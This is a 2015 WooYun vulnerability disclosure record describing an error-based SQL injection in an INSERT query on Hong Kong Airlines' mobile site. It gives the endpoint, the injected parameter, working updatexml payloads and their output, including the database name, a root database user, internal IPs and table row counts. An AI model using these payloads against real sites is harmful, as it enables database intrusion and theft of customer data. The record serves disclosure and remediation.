{"id": 72158, "wybug_id": "wooyun-2015-0152044", "wybug_title": "香港航空某站一处Insert注入（XPATH/手工测试）", "wybug_corp": "香港航空", "wybug_author": "goubuli", "wybug_date": "2015-11-05 15:11", "wybug_open_date": "2015-12-20 17:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-20：\t细节向公众公开  简要描述： 如题 详细说明：  注入出在主站的mobile端，即：\nhttp://m.hongkongairlines.com/\n我看到今天刚公开的注入点： WooYun: 香港航空某站存在SQL注入 还是没有修补如图：\n\n于是接着翻了翻，又翻到了一个Insert注入，采用技巧来自\nhttp://drops.wooyun.org/tips/2078\n于是翻到了很多，可利用注出数据的只有一个\nhttp://m.hongkongairlines.com/ci/index.php/state/analysisPOST：ctoke=1\n加入'：\nctoke=1'\n\n\n爆出：\n查询语句错误 [1064]错误信息: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '115.182.66.148','search','search','查询航线','1446706502',CURRENT_TIMESTAMP)' at line 1SQL: INSERT INTO `aio_push_server`.`pre_phone_user_event`(`id`,`app_id`,`app_name`,`app_version`,`channel_name`,`uid`,`ip`,`event_name`,`event_type`,`event_detail`,`timestamp`,`mysql_timestamp`) VALUES ( NULL,'3','港行html5_3_html5_html5','1.0','','a'','115.182.66.148','search','search','查询航线','1446706502',CURRENT_TIMESTAMP)点击这里寻求帮助PHP BacktraceFile\tLine\tFunctionsource/class/class_core.php\t857\tdb_mysql->halt()source/class/class_core.php\t1105\tdb_mysql->query()source/module/analysis/analysis_post_event_msg.php\t31\tDB::query()analysis.php\t41\trequire()\n主要SQL语句：\nINSERT INTO `aio_push_server`.`pre_phone_user_event`(`id`,`app_id`,`app_name`,`app_version`,`channel_name`,`uid`,`ip`,`event_name`,`event_type`,`event_detail`,`timestamp`,`mysql_timestamp`) VALUES ( NULL,'3','港行html5_3_html5_html5','1.0','','a'','115.182.66.148','search','search','查询航线','1446706502',CURRENT_TIMESTAMP)\n下面就是利用drops里的技巧构造：\nctoke=a'or updatexml(1,concat(0x7e,database(),0x7e),0) or'\n\n\n注出数据库：\nhkshares\n\n\n\nuser：root@172.16.1.105\n前一个SQL漏洞，@中央军 他跑的表不是hkshares的当前库。也就证明了可以跨库。下面证明数据量大小\nhttp://m.hongkongairlines.com/ci/index.php/state/analysisctoke=a'or updatexml(1,concat(0x7e,(select count(*) from pre_common_member_profile),0x7e),0) or'\n\n\n得到库hkshares中pre_common_member_profile条数：\n29106\n随便看库aio_umsdata中的一个表：razor_persistdata\n\n数据量31万多条：\n317452\n因为root权限，想getshell，本地Insert测试getshell成功了。。。但是这个站点有了路径不知道怎么去访问。。。其他不一一测试   漏洞证明：  上面已经证明   修复方案：  连同 WooYun: 香港航空某站存在SQL注入 这个洞一起做过滤修补吧。   版权声明：转载请注明来源 goubuli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2015-11-05 17:20 厂商回复： 谢谢，我们将安排进行修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}